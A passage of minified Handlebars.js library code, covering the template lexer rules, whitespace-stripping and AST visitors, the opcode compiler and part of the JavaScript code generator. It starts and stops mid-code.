this._input=t,this._more=this._less=this.done=!1,this.yylineno=this.yyleng=0,this.yytext=this.matched=this.match="",this.conditionStack=["INITIAL"],this.yylloc={first_line:1,first_column:0,last_line:1,last_column:0},this.options.ranges&&(this.yylloc.range=[0,0]),this.offset=0,this},input:function(){var t=this._input[0];return this.yytext+=t,this.yyleng++,this.offset++,this.match+=t,this.matched+=t,t.match(/(?:\r\n?|\n).*/g)?(this.yylineno++,this.yylloc.last_line++):this.yylloc.last_column++,this.options.ranges&&this.yylloc.range[1]++,this._input=this._input.slice(1),t},unput:function(t){var e=t.length,n=t.split(/(?:\r\n?|\n)/g);this._input=t+this._input,this.yytext=this.yytext.substr(0,this.yytext.length-e-1),this.offset-=e;var i=this.match.split(/(?:\r\n?|\n)/g);this.match=this.match.substr(0,this.match.length-1),this.matched=this.matched.substr(0,this.matched.length-1),n.length-1&&(this.yylineno-=n.length-1);var r=this.yylloc.range;return this.yylloc={first_line:this.yylloc.first_line,last_line:this.yylineno+1,first_column:this.yylloc.first_column,last_column:n?(n.length===i.length?this.yylloc.first_column:0)+i[i.length-n.length].length-n[0].length:this.yylloc.first_column-e},this.options.ranges&&(this.yylloc.range=[r[0],r[0]+this.yyleng-e]),this},more:function(){return this._more=!0,this},less:function(t){this.unput(this.match.slice(t))},pastInput:function(){var t=this.matched.substr(0,this.matched.length-this.match.length);return(t.length>20?"...":"")+t.substr(-20).replace(/\n/g,"")},upcomingInput:function(){var t=this.match;return t.length<20&&(t+=this._input.substr(0,20-t.length)),(t.substr(0,20)+(t.length>20?"...":"")).replace(/\n/g,"")},showPosition:function(){var t=this.pastInput(),e=new Array(t.length+1).join("-");return t+this.upcomingInput()+"\n"+e+"^"},next:function(){if(this.done)return this.EOF;var t,e,n,i,r;this._input||(this.done=!0),this._more||(this.yytext="",this.match="");for(var o=this._currentRules(),s=0;s<o.length&&(!(n=this._input.match(this.rules[o[s]]))||e&&!(n[0].length>e[0].length)||(e=n,i=s,this.options.flex));s++);return e?((r=e[0].match(/(?:\r\n?|\n).*/g))&&(this.yylineno+=r.length),this.yylloc={first_line:this.yylloc.last_line,last_line:this.yylineno+1,first_column:this.yylloc.last_column,last_column:r?r[r.length-1].length-r[r.length-1].match(/\r?\n?/)[0].length:this.yylloc.last_column+e[0].length},this.yytext+=e[0],this.match+=e[0],this.matches=e,this.yyleng=this.yytext.length,this.options.ranges&&(this.yylloc.range=[this.offset,this.offset+=this.yyleng]),this._more=!1,this._input=this._input.slice(e[0].length),this.matched+=e[0],t=this.performAction.call(this,this.yy,this,o[i],this.conditionStack[this.conditionStack.length-1]),this.done&&this._input&&(this.done=!1),t||void 0):""===this._input?this.EOF:this.parseError("Lexical error on line "+(this.yylineno+1)+". Unrecognized text.\n"+this.showPosition(),{text:"",token:null,line:this.yylineno})},lex:function(){var t=this.next();return void 0!==t?t:this.lex()},begin:function(t){this.conditionStack.push(t)},popState:function(){return this.conditionStack.pop()},_currentRules:function(){return this.conditions[this.conditionStack[this.conditionStack.length-1]].rules},topState:function(){return this.conditionStack[this.conditionStack.length-2]},pushState:function(t){this.begin(t)},options:{},performAction:function(t,e,n,i){function r(t,n){return e.yytext=e.yytext.substring(t,e.yyleng-n+t)}switch(n){case 0:if("\\\\"===e.yytext.slice(-2)?(r(0,1),this.begin("mu")):"\\"===e.yytext.slice(-1)?(r(0,1),this.begin("emu")):this.begin("mu"),e.yytext)return 15;break;case 1:case 5:return 15;case 2:return this.popState(),15;case 3:return this.begin("raw"),15;case 4:return this.popState(),"raw"===this.conditionStack[this.conditionStack.length-1]?15:(r(5,9),"END_RAW_BLOCK");case 6:case 22:return this.popState(),14;case 7:return 65;case 8:return 68;case 9:return 19;case 10:return this.popState(),this.begin("raw"),23;case 11:return 55;case 12:return 60;case 13:return 29;case 14:return 47;case 15:case 16:return this.popState(),44;case 17:return 34;case 18:return 39;case 19:return 51;case 20:case 23:return 48;case 21:this.unput(e.yytext),this.popState(),this.begin("com");break;case 24:return 73;case 25:case 26:case 41:return 72;case 27:return 87;case 28:break;case 29:return this.popState(),54;case 30:return this.popState(),33;case 31:return e.yytext=r(1,2).replace(/\\"/g,'"'),80;case 32:return e.yytext=r(1,2).replace(/\\'/g,"'"),80;case 33:return 85;case 34:case 35:return 82;case 36:return 83;case 37:return 84;case 38:return 81;case 39:return 75;case 40:return 77;case 42:return e.yytext=e.yytext.replace(/\\([\\\]])/g,"$1"),72;case 43:return"INVALID";case 44:return 5}},rules:[/^(?:[^\x00]*?(?=(\{\{)))/,/^(?:[^\x00]+)/,/^(?:[^\x00]{2,}?(?=(\{\{|\\\{\{|\\\\\{\{|$)))/,/^(?:\{\{\{\{(?=[^\/]))/,/^(?:\{\{\{\{\/[^\s!"#%-,\.\/;->@\[-\^`\{-~]+(?=[=}\s\/.])\}\}\}\})/,/^(?:[^\x00]*?(?=(\{\{\{\{)))/,/^(?:[\s\S]*?--(~)?\}\})/,/^(?:\()/,/^(?:\))/,/^(?:\{\{\{\{)/,/^(?:\}\}\}\})/,/^(?:\{\{(~)?>)/,/^(?:\{\{(~)?#>)/,/^(?:\{\{(~)?#\*?)/,/^(?:\{\{(~)?\/)/,/^(?:\{\{(~)?\^\s*(~)?\}\})/,/^(?:\{\{(~)?\s*else\s*(~)?\}\})/,/^(?:\{\{(~)?\^)/,/^(?:\{\{(~)?\s*else\b)/,/^(?:\{\{(~)?\{)/,/^(?:\{\{(~)?&)/,/^(?:\{\{(~)?!--)/,/^(?:\{\{(~)?![\s\S]*?\}\})/,/^(?:\{\{(~)?\*?)/,/^(?:=)/,/^(?:\.\.)/,/^(?:\.(?=([=~}\s\/.)|])))/,/^(?:[\/.])/,/^(?:\s+)/,/^(?:\}(~)?\}\})/,/^(?:(~)?\}\})/,/^(?:"(\\["]|[^"])*")/,/^(?:'(\\[']|[^'])*')/,/^(?:@)/,/^(?:true(?=([~}\s)])))/,/^(?:false(?=([~}\s)])))/,/^(?:undefined(?=([~}\s)])))/,/^(?:null(?=([~}\s)])))/,/^(?:-?[0-9]+(?:\.[0-9]+)?(?=([~}\s)])))/,/^(?:as\s+\|)/,/^(?:\|)/,/^(?:([^\s!"#%-,\.\/;->@\[-\^`\{-~]+(?=([=~}\s\/.)|]))))/,/^(?:\[(\\\]|[^\]])*\])/,/^(?:.)/,/^(?:$)/],conditions:{mu:{rules:[7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44],inclusive:!1},emu:{rules:[2],inclusive:!1},com:{rules:[6],inclusive:!1},raw:{rules:[3,4,5],inclusive:!1},INITIAL:{rules:[0,1,44],inclusive:!0}}};return t}();return e.lexer=n,t.prototype=e,e.Parser=t,new t}();e.default=n,t.exports=e.default},function(t,e,n){"use strict";function i(){var t=arguments.length<=0||void 0===arguments[0]?{}:arguments[0];this.options=t}function r(t,e,n){void 0===e&&(e=t.length);var i=t[e-1],r=t[e-2];return i?"ContentStatement"===i.type?(r||!n?/\r?\n\s*?$/:/(^|\r?\n)\s*?$/).test(i.original):void 0:n}function o(t,e,n){void 0===e&&(e=-1);var i=t[e+1],r=t[e+2];return i?"ContentStatement"===i.type?(r||!n?/^\s*?\r?\n/:/^\s*?(\r?\n|$)/).test(i.original):void 0:n}function s(t,e,n){var i=t[null==e?0:e+1];if(i&&"ContentStatement"===i.type&&(n||!i.rightStripped)){var r=i.value;i.value=i.value.replace(n?/^\s+/:/^[ \t]*\r?\n?/,""),i.rightStripped=i.value!==r}}function a(t,e,n){var i=t[null==e?t.length-1:e-1];if(i&&"ContentStatement"===i.type&&(n||!i.leftStripped)){var r=i.value;return i.value=i.value.replace(n?/\s+$/:/[ \t]+$/,""),i.leftStripped=i.value!==r,i.leftStripped}}var l=n(1).default;e.__esModule=!0;var c=l(n(39));i.prototype=new c.default,i.prototype.Program=function(t){var e=!this.options.ignoreStandalone,n=!this.isRootSeen;this.isRootSeen=!0;for(var i=t.body,l=0,c=i.length;l<c;l++){var u=i[l],d=this.accept(u);if(d){var h=r(i,l,n),f=o(i,l,n),p=d.openStandalone&&h,g=d.closeStandalone&&f,m=d.inlineStandalone&&h&&f;d.close&&s(i,l,!0),d.open&&a(i,l,!0),e&&m&&(s(i,l),a(i,l)&&"PartialStatement"===u.type&&(u.indent=/([ \t]+$)/.exec(i[l-1].original)[1])),e&&p&&(s((u.program||u.inverse).body),a(i,l)),e&&g&&(s(i,l),a((u.inverse||u.program).body))}}return t},i.prototype.BlockStatement=i.prototype.DecoratorBlock=i.prototype.PartialBlockStatement=function(t){this.accept(t.program),this.accept(t.inverse);var e=t.program||t.inverse,n=t.program&&t.inverse,i=n,l=n;if(n&&n.chained)for(i=n.body[0].program;l.chained;)l=l.body[l.body.length-1].program;var c={open:t.openStrip.open,close:t.closeStrip.close,openStandalone:o(e.body),closeStandalone:r((i||e).body)};if(t.openStrip.close&&s(e.body,null,!0),n){var u=t.inverseStrip;u.open&&a(e.body,null,!0),u.close&&s(i.body,null,!0),t.closeStrip.open&&a(l.body,null,!0),!this.options.ignoreStandalone&&r(e.body)&&o(i.body)&&(a(e.body),s(i.body))}else t.closeStrip.open&&a(e.body,null,!0);return c},i.prototype.Decorator=i.prototype.MustacheStatement=function(t){return t.strip},i.prototype.PartialStatement=i.prototype.CommentStatement=function(t){var e=t.strip||{};return{inlineStandalone:!0,open:e.open,close:e.close}},e.default=i,t.exports=e.default},function(t,e,n){"use strict";function i(){this.parents=[]}function r(t){this.acceptRequired(t,"path"),this.acceptArray(t.params),this.acceptKey(t,"hash")}function o(t){r.call(this,t),this.acceptKey(t,"program"),this.acceptKey(t,"inverse")}function s(t){this.acceptRequired(t,"name"),this.acceptArray(t.params),this.acceptKey(t,"hash")}var a=n(1).default;e.__esModule=!0;var l=a(n(6));i.prototype={constructor:i,mutating:!1,acceptKey:function(t,e){var n=this.accept(t[e]);if(this.mutating){if(n&&!i.prototype[n.type])throw new l.default('Unexpected node type "'+n.type+'" found when accepting '+e+" on "+t.type);t[e]=n}},acceptRequired:function(t,e){if(this.acceptKey(t,e),!t[e])throw new l.default(t.type+" requires "+e)},acceptArray:function(t){for(var e=0,n=t.length;e<n;e++)this.acceptKey(t,e),t[e]||(t.splice(e,1),e--,n--)},accept:function(t){if(t){if(!this[t.type])throw new l.default("Unknown type: "+t.type,t);this.current&&this.parents.unshift(this.current),this.current=t;var e=this[t.type](t);return this.current=this.parents.shift(),!this.mutating||e?e:!1!==e?t:void 0}},Program:function(t){this.acceptArray(t.body)},MustacheStatement:r,Decorator:r,BlockStatement:o,DecoratorBlock:o,PartialStatement:s,PartialBlockStatement:function(t){s.call(this,t),this.acceptKey(t,"program")},ContentStatement:function(){},CommentStatement:function(){},SubExpression:r,PathExpression:function(){},StringLiteral:function(){},NumberLiteral:function(){},BooleanLiteral:function(){},UndefinedLiteral:function(){},NullLiteral:function(){},Hash:function(t){this.acceptArray(t.pairs)},HashPair:function(t){this.acceptRequired(t,"value")}},e.default=i,t.exports=e.default},function(t,e,n){"use strict";function i(t,e){if(e=e.path?e.path.original:e,t.path.original!==e){var n={loc:t.path.loc};throw new o.default(t.path.original+" doesn't match "+e,n)}}var r=n(1).default;e.__esModule=!0,e.SourceLocation=function(t,e){this.source=t,this.start={line:e.first_line,column:e.first_column},this.end={line:e.last_line,column:e.last_column}},e.id=function(t){return/^\[.*\]$/.test(t)?t.substring(1,t.length-1):t},e.stripFlags=function(t,e){return{open:"~"===t.charAt(2),close:"~"===e.charAt(e.length-3)}},e.stripComment=function(t){return t.replace(/^\{\{~?!-?-?/,"").replace(/-?-?~?\}\}$/,"")},e.preparePath=function(t,e,n){n=this.locInfo(n);for(var i=t?"@":"",r=[],s=0,a=0,l=e.length;a<l;a++){var c=e[a].part,u=e[a].original!==c;if(i+=(e[a].separator||"")+c,u||".."!==c&&"."!==c&&"this"!==c)r.push(c);else{if(r.length>0)throw new o.default("Invalid path: "+i,{loc:n});".."===c&&s++}}return{type:"PathExpression",data:t,depth:s,parts:r,original:i,loc:n}},e.prepareMustache=function(t,e,n,i,r,o){var s=i.charAt(3)||i.charAt(2),a="{"!==s&&"&"!==s;return{type:/\*/.test(i)?"Decorator":"MustacheStatement",path:t,params:e,hash:n,escaped:a,strip:r,loc:this.locInfo(o)}},e.prepareRawBlock=function(t,e,n,r){i(t,n);var o={type:"Program",body:e,strip:{},loc:r=this.locInfo(r)};return{type:"BlockStatement",path:t.path,params:t.params,hash:t.hash,program:o,openStrip:{},inverseStrip:{},closeStrip:{},loc:r}},e.prepareBlock=function(t,e,n,r,s,a){r&&r.path&&i(t,r);var l=/\*/.test(t.open);e.blockParams=t.blockParams;var c=void 0,u=void 0;if(n){if(l)throw new o.default("Unexpected inverse block on decorator",n);n.chain&&(n.program.body[0].closeStrip=r.strip),u=n.strip,c=n.program}return s&&(s=c,c=e,e=s),{type:l?"DecoratorBlock":"BlockStatement",path:t.path,params:t.params,hash:t.hash,program:e,inverse:c,openStrip:t.strip,inverseStrip:u,closeStrip:r&&r.strip,loc:this.locInfo(a)}},e.prepareProgram=function(t,e){if(!e&&t.length){var n=t[0].loc,i=t[t.length-1].loc;n&&i&&(e={source:n.source,start:{line:n.start.line,column:n.start.column},end:{line:i.end.line,column:i.end.column}})}return{type:"Program",body:t,strip:{},loc:e}},e.preparePartialBlock=function(t,e,n,r){return i(t,n),{type:"PartialBlockStatement",name:t.path,params:t.params,hash:t.hash,program:e,openStrip:t.strip,closeStrip:n&&n.strip,loc:this.locInfo(r)}};var o=r(n(6))},function(t,e,n){"use strict";function i(){}function r(t,e){if(t===e)return!0;if(l.isArray(t)&&l.isArray(e)&&t.length===e.length){for(var n=0;n<t.length;n++)if(!r(t[n],e[n]))return!1;return!0}}function o(t){if(!t.path.parts){var e=t.path;t.path={type:"PathExpression",data:!1,depth:0,parts:[e.original+""],original:e.original+"",loc:e.loc}}}var s=n(1).default;e.__esModule=!0,e.Compiler=i,e.precompile=function(t,e,n){if(null==t||"string"!=typeof t&&"Program"!==t.type)throw new a.default("You must pass a string or Handlebars AST to Handlebars.precompile. You passed "+t);"data"in(e=e||{})||(e.data=!0),e.compat&&(e.useDepths=!0);var i=n.parse(t,e),r=(new n.Compiler).compile(i,e);return(new n.JavaScriptCompiler).compile(r,e)},e.compile=function(t,e,n){function i(){var i=n.parse(t,e),r=(new n.Compiler).compile(i,e),o=(new n.JavaScriptCompiler).compile(r,e,void 0,!0);return n.template(o)}function r(t,e){return o||(o=i()),o.call(this,t,e)}if(void 0===e&&(e={}),null==t||"string"!=typeof t&&"Program"!==t.type)throw new a.default("You must pass a string or Handlebars AST to Handlebars.compile. You passed "+t);"data"in(e=l.extend({},e))||(e.data=!0),e.compat&&(e.useDepths=!0);var o=void 0;return r._setup=function(t){return o||(o=i()),o._setup(t)},r._child=function(t,e,n,r){return o||(o=i()),o._child(t,e,n,r)},r};var a=s(n(6)),l=n(5),c=s(n(35)),u=[].slice;i.prototype={compiler:i,equals:function(t){var e=this.opcodes.length;if(t.opcodes.length!==e)return!1;for(var n=0;n<e;n++){var i=this.opcodes[n],o=t.opcodes[n];if(i.opcode!==o.opcode||!r(i.args,o.args))return!1}e=this.children.length;for(n=0;n<e;n++)if(!this.children[n].equals(t.children[n]))return!1;return!0},guid:0,compile:function(t,e){this.sourceNode=[],this.opcodes=[],this.children=[],this.options=e,this.stringParams=e.stringParams,this.trackIds=e.trackIds,e.blockParams=e.blockParams||[];var n=e.knownHelpers;if(e.knownHelpers={helperMissing:!0,blockHelperMissing:!0,each:!0,if:!0,unless:!0,with:!0,log:!0,lookup:!0},n)for(var i in n)this.options.knownHelpers[i]=n[i];return this.accept(t)},compileProgram:function(t){var e=(new this.compiler).compile(t,this.options),n=this.guid++;return this.usePartial=this.usePartial||e.usePartial,this.children[n]=e,this.useDepths=this.useDepths||e.useDepths,n},accept:function(t){if(!this[t.type])throw new a.default("Unknown type: "+t.type,t);this.sourceNode.unshift(t);var e=this[t.type](t);return this.sourceNode.shift(),e},Program:function(t){this.options.blockParams.unshift(t.blockParams);for(var e=t.body,n=e.length,i=0;i<n;i++)this.accept(e[i]);return this.options.blockParams.shift(),this.isSimple=1===n,this.blockParams=t.blockParams?t.blockParams.length:0,this},BlockStatement:function(t){o(t);var e=t.program,n=t.inverse;e=e&&this.compileProgram(e),n=n&&this.compileProgram(n);var i=this.classifySexpr(t);"helper"===i?this.helperSexpr(t,e,n):"simple"===i?(this.simpleSexpr(t),this.opcode("pushProgram",e),this.opcode("pushProgram",n),this.opcode("emptyHash"),this.opcode("blockValue",t.path.original)):(this.ambiguousSexpr(t,e,n),this.opcode("pushProgram",e),this.opcode("pushProgram",n),this.opcode("emptyHash"),this.opcode("ambiguousBlockValue")),this.opcode("append")},DecoratorBlock:function(t){var e=t.program&&this.compileProgram(t.program),n=this.setupFullMustacheParams(t,e,void 0),i=t.path;this.useDecorators=!0,this.opcode("registerDecorator",n.length,i.original)},PartialStatement:function(t){this.usePartial=!0;var e=t.program;e&&(e=this.compileProgram(t.program));var n=t.params;if(n.length>1)throw new a.default("Unsupported number of partial arguments: "+n.length,t);n.length||(this.options.explicitPartialContext?this.opcode("pushLiteral","undefined"):n.push({type:"PathExpression",parts:[],depth:0}));var i=t.name.original,r="SubExpression"===t.name.type;r&&this.accept(t.name),this.setupFullMustacheParams(t,e,void 0,!0);var o=t.indent||"";this.options.preventIndent&&o&&(this.opcode("appendContent",o),o=""),this.opcode("invokePartial",r,i,o),this.opcode("append")},PartialBlockStatement:function(t){this.PartialStatement(t)},MustacheStatement:function(t){this.SubExpression(t),t.escaped&&!this.options.noEscape?this.opcode("appendEscaped"):this.opcode("append")},Decorator:function(t){this.DecoratorBlock(t)},ContentStatement:function(t){t.value&&this.opcode("appendContent",t.value)},CommentStatement:function(){},SubExpression:function(t){o(t);var e=this.classifySexpr(t);"simple"===e?this.simpleSexpr(t):"helper"===e?this.helperSexpr(t):this.ambiguousSexpr(t)},ambiguousSexpr:function(t,e,n){var i=t.path,r=i.parts[0],o=null!=e||null!=n;this.opcode("getContext",i.depth),this.opcode("pushProgram",e),this.opcode("pushProgram",n),i.strict=!0,this.accept(i),this.opcode("invokeAmbiguous",r,o)},simpleSexpr:function(t){var e=t.path;e.strict=!0,this.accept(e),this.opcode("resolvePossibleLambda")},helperSexpr:function(t,e,n){var i=this.setupFullMustacheParams(t,e,n),r=t.path,o=r.parts[0];if(this.options.knownHelpers[o])this.opcode("invokeKnownHelper",i.length,o);else{if(this.options.knownHelpersOnly)throw new a.default("You specified knownHelpersOnly, but used the unknown helper "+o,t);r.strict=!0,r.falsy=!0,this.accept(r),this.opcode("invokeHelper",i.length,r.original,c.default.helpers.simpleId(r))}},PathExpression:function(t){this.addDepth(t.depth),this.opcode("getContext",t.depth);var e=t.parts[0],n=c.default.helpers.scopedId(t),i=!t.depth&&!n&&this.blockParamIndex(e);i?this.opcode("lookupBlockParam",i,t.parts):e?t.data?(this.options.data=!0,this.opcode("lookupData",t.depth,t.parts,t.strict)):this.opcode("lookupOnContext",t.parts,t.falsy,t.strict,n):this.opcode("pushContext")},StringLiteral:function(t){this.opcode("pushString",t.value)},NumberLiteral:function(t){this.opcode("pushLiteral",t.value)},BooleanLiteral:function(t){this.opcode("pushLiteral",t.value)},UndefinedLiteral:function(){this.opcode("pushLiteral","undefined")},NullLiteral:function(){this.opcode("pushLiteral","null")},Hash:function(t){var e=t.pairs,n=0,i=e.length;for(this.opcode("pushHash");n<i;n++)this.pushParam(e[n].value);for(;n--;)this.opcode("assignToHash",e[n].key);this.opcode("popHash")},opcode:function(t){this.opcodes.push({opcode:t,args:u.call(arguments,1),loc:this.sourceNode[0].loc})},addDepth:function(t){t&&(this.useDepths=!0)},classifySexpr:function(t){var e=c.default.helpers.simpleId(t.path),n=e&&!!this.blockParamIndex(t.path.parts[0]),i=!n&&c.default.helpers.helperExpression(t),r=!n&&(i||e);if(r&&!i){var o=t.path.parts[0],s=this.options;s.knownHelpers[o]?i=!0:s.knownHelpersOnly&&(r=!1)}return i?"helper":r?"ambiguous":"simple"},pushParams:function(t){for(var e=0,n=t.length;e<n;e++)this.pushParam(t[e])},pushParam:function(t){var e=null!=t.value?t.value:t.original||"";if(this.stringParams)e.replace&&(e=e.replace(/^(\.?\.\/)*/g,"").replace(/\//g,".")),t.depth&&this.addDepth(t.depth),this.opcode("getContext",t.depth||0),this.opcode("pushStringParam",e,t.type),"SubExpression"===t.type&&this.accept(t);else{if(this.trackIds){var n=void 0;if(!t.parts||c.default.helpers.scopedId(t)||t.depth||(n=this.blockParamIndex(t.parts[0])),n){var i=t.parts.slice(1).join(".");this.opcode("pushId","BlockParam",n,i)}else(e=t.original||e).replace&&(e=e.replace(/^this(?:\.|$)/,"").replace(/^\.\//,"").replace(/^\.$/,"")),this.opcode("pushId",t.type,e)}this.accept(t)}},setupFullMustacheParams:function(t,e,n,i){var r=t.params;return this.pushParams(r),this.opcode("pushProgram",e),this.opcode("pushProgram",n),t.hash?this.accept(t.hash):this.opcode("emptyHash",i),r},blockParamIndex:function(t){for(var e=0,n=this.options.blockParams.length;e<n;e++){var i=this.options.blockParams[e],r=i&&l.indexOf(i,t);if(i&&r>=0)return[e,r]}}}},function(t,e,n){"use strict";function i(t){this.value=t}function r(){}var o=n(1).default;e.__esModule=!0;var s=n(4),a=o(n(6)),l=n(5),c=o(n(43));r.prototype={nameLookup:function(t,e){return"constructor"===e?["(",t,".propertyIsEnumerable('constructor') ? ",t,".constructor : undefined",")"]:r.isValidJavaScriptVariableName(e)?[t,".",e]:[t,"[",JSON.stringify(e),"]"]},depthedLookup:function(t){return[this.aliasable("container.lookup"),'(depths, "',t,'")']},compilerInfo:function(){var t=s.COMPILER_REVISION;return[t,s.REVISION_CHANGES[t]]},appendToBuffer:function(t,e,n){return l.isArray(t)||(t=[t]),t=this.source.wrap(t,e),this.environment.isSimple?["return ",t,";"]:n?["buffer += ",t,";"]:(t.appendToBuffer=!0,t)},initializeBuffer:function(){return this.quotedString("")},compile:function(t,e,n,i){this.environment=t,this.options=e,this.stringParams=this.options.stringParams,this.trackIds=this.options.trackIds,this.precompile=!i,this.name=this.environment.name,this.isChild=!!n,this.context=n||{decorators:[],programs:[],environments:[]},this.preamble(),this.stackSlot=0,this.stackVars=[],this.aliases={},this.registers={list:[]},this.hashes=[],this.compileStack=[],this.inlineStack=[],this.blockParams=[],this.compileChildren(t,e),this.useDepths=this.useDepths||t.useDepths||t.useDecorators||this.options.compat,this.useBlockParams=this.useBlockParams||t.useBlockParams;var r=t.opcodes,o=void 0,s=void 0,l=void 0,c=void 0;for(l=0,c=r.length;l<c;l++)o=r[l],this.source.currentLocation=o.loc,s=s||o.loc,this[o.opcode].apply(this,o.args);if(this.source.currentLocation=s,this.pushSource(""),this.stackSlot||this.inlineStack.length||this.compileStack.length)throw new a.default("Compile completed with content left on stack");this.decorators.isEmpty()?this.decorators=void 0:(this.useDecorators=!0,this.decorators.prepend("var decorators = container.decorators;\n"),this.decorators.push("return fn;"),i?this.decorators=Function.apply(this,["fn","props","container","depth0","data","blockParams","depths",this.decorators.merge()]):(this.decorators.prepend("function(fn, props, container, depth0, data, blockParams, depths) {\n"),this.decorators.push("}\n"),this.decorators=this.decorators.merge()));var u=this.createFunctionContext(i);if(this.isChild)return u;var d={compiler:this.compilerInfo(),main:u};this.decorators&&(d.main_d=this.decorators,d.useDecorators=!0);var h=this.context,f=h.programs,p=h.decorators;for(l=0,c=f.length;l<c;l++)f[l]&&(d[l]=f[l],p[l]&&(d[l+"_d"]=p[l],d.useDecorators=!0));return this.environment.usePartial&&(d.usePartial=!0),this.options.data&&(d.useData=!0),this.useDepths&&(d.useDepths=!0),this.useBlockParams&&(d.useBlockParams=!0),this.options.compat&&(d.compat=!0),i?d.compilerOptions=this.options:(d.compiler=JSON.stringify(d.compiler),this.source.currentLocation={start:{line:1,column:0}},d=this.objectLiteral(d),e.srcName?(d=d.toStringWithSourceMap({file:e.destName})).map=d.map&&d.map.toString():d=d.toString()),d},preamble:function(){this.lastContext=0,this.source=new c.default(this.options.srcName),this.decorators=new c.default(this.options.srcName)},createFunctionContext:function(t){var e="",n=this.stackVars.concat(this.registers.list);n.length>0&&(e+=", "+n.join(", "));var i=0;for(var r in this.aliases){var o=this.aliases[r];this.aliases.hasOwnProperty(r)&&o.children&&o.referenceCount>1&&(e+=", alias"+ ++i+"="+r,o.children[0]="alias"+i)}var s=["container","depth0","helpers","partials","data"];(this.useBlockParams||this.useDepths)&&s.push("blockParams"),this.useDepths&&s.push("depths");var a=this.mergeSource(e);return t?(s.push(a),Function.apply(this,s)):this.source.wrap(["function(",s.join(","),") {\n  ",a,"}"])},mergeSource:function(t){var e=this.environment.isSimple,n=!this.forceBuffer,i=void 0,r=void 0,o=void 0,s=void 0;return this.source.each((function(t){t.appendToBuffer?(o?t.prepend("  + "):o=t,s=t):(o&&(r?o.prepend("buffer += "):i=!0,s.add(";"),o=s=void 0),r=!0,e||(n=!1))})),n?o?(o.prepend("return "),s.add(";")):r||this.source.push('return "";'):(t+=", buffer = "+(i?"":this.initializeBuffer()),o?(o.prepend("return buffer + "),s.add(";")):this.source.push("return buffer;")),t&&this.source.prepend("var "+t.substring(2)+(i?"":";\n")),this.source.merge()},blockValue:function(t){var e=this.aliasable("helpers.blockHelperMissing"),n=[this.contextName(0)];this.setupHelperArgs(t,0,n);var i=this.popStack();n.splice(1,0,i),this.push(this.source.functionCall(e,"call",n))},ambiguousBlockValue:function(){var t=this.aliasable("helpers.blockHelperMissing"),e=[this.contextName(0)];this.setupHelperArgs("",0,e,!0),this.flushInline();var n=this.topStack();e.splice(1,0,n),this.pushSource(["if (!",this.lastHelper,") { ",n," = ",this.source.functionCall(t,"call",e),"}"])},appendContent:function(t){this.pendingContent?t=this.pendingContent+t:this.pendingLocation=this.source.currentLocation,this.pendingContent=t},append:function(){if(this.isInline())this.replaceStack((function(t){return[" != null ? ",t,' : ""']})),this.pushSource(this.appendToBuffer(this.popStack()));else{var t=this.popStack();this.pushSource(["if (",t," != null) { ",this.appendToBuffer(t,void 0,!0)," }"]),this.environment.isSimple&&this.pushSource(["else { ",this.appendToBuffer("''",void 0,!0)," }"])}},appendEscaped:function(){this.pushSource(this.appendToBuffer([this.aliasable("container.escapeExpression"),"(",this.popStack(),")"]))},getContext:function(t){this.lastContext=t},pushContext:function(){this.pushStackLiteral(this.contextName(this.lastContext))},lookupOnContext:function(t,e,n,i){var r=0;i||!this.options.compat||this.lastContext?this.pushContext():this.push(this.depthedLookup(t[r++])),this.resolvePath("context",t,r,e,n)},lookupBlockParam:function(t,e){this.useBlockParams=!0,this.push(["blockParams[",t[0],"][",t[1],"]"]),this.resolvePath("context",e,1)},lookupData:function(t,e,n){t?this.pushStackLiteral("container.data(data, "+t+")"):this.pushStackLiteral("data"),this.resolvePath("data",e,0,!0,n)},resolvePath:function(t,e,n,i,r){var o=this;if(this.options.strict||this.options.assumeObjects)this.push(function(t,e,n,i){var r=e.popStack(),o=0,s=n.length;for(t&&s--;o<s;o++)r=e.nameLookup(r,n[o],i);return t?[e.aliasable("container.strict"),"(",r,", ",e.quotedString(n[o]),")"]:r}(this.options.strict&&r,this,e,t));else for(var s=e.length;n<s;n++)this.replaceStack((function(r){var s=o.nameLookup(r,e[n],t);return i?[" && ",s]:[" != null ? ",s," : ",r]}))},resolvePossibleLambda:function(){this.push([this.aliasable("container.lambda"),"(",this.popStack(),", ",this.contextName(0),")"])},pushStringParam:function(t,e){this.pushContext(),this.pushString(e),"SubExpression"!==e&&("string"==typeof t?this.pushString(t):this.pushStackLiteral(t))},emptyHash:function(t){this.trackIds&&this.push("{}"),this.stringParams&&(this.push("{}"),this.push("{}")),this.pushStackLiteral(t?"undefined":"{}")},pushHash:function(){this.hash&&this.hashes.push(this.hash),this.hash={values:[],types:[],contexts:[],ids:[]}},popHash:function(){var t=this.hash;this.hash=this.hashes.pop(),this.trackIds&&this.push(this.objectLiteral(t.ids)),this.stringParams&&(this.push(this.objectLiteral(t.contexts)),this.push(this.objectLiteral(t.types))),this.push(this.objectLiteral(t.values))},pushString:function(t){this.pushStackLiteral(this.quotedString(t))},pushLiteral:function(t){this.pushStackLiteral(t)},pushProgram:function(t){null!=t?this.pushStackLiteral(this.programExpression(t)):this.pushStackLiteral(null)},registerDecorator:function(t,e){var n=this.nameLookup("decorators",e,"decorator"),i=this.setupHelperArgs(e,t);this.decorators.push(["fn = ",this.decorators.functionCall(n,"",["fn","props","container",i])," || fn;"])},invokeHelper:function(t,e,n){var i=this.popStack(),r=this.setupHelper(t,e),o=n?[r.name," || "]:"",s=["("].concat(o,i);this.options.strict||s.push(" || ",this.aliasable("helpers.helperMissing")),s.push(")"),this.push(this.source.functionCall(s,"call",r.callParams))},invokeKnownHelper:function(t,e){var n=this.setupHelper(t,e);this.push(this.source.functionCall(n.name,"call",n.callParams))},invokeAmbiguous:function(t,e){this.useRegister("helper");var n=this.popStack();this.emptyHash();var i=this.setupHelper(0,t,e),r=["(","(helper = ",this.lastHelper=this.nameLookup("helpers",t,"helper")," || ",n,")"];this.options.strict||(r[0]="(helper = ",r.push(" != null ? helper : ",this.aliasable("helpers.helperMissing"))),this.push(["(",r,i.paramsInit?["),(",i.paramsInit]:[],"),","(typeof helper === ",this.aliasable('"function"')," ? ",this.source.functionCall("helper","call",i.callParams)," : helper))"])},invokePartial:function(t,e,n){var i=[],r=this.setupParams(e,1,i);t&&(e=this.popStack(),delete 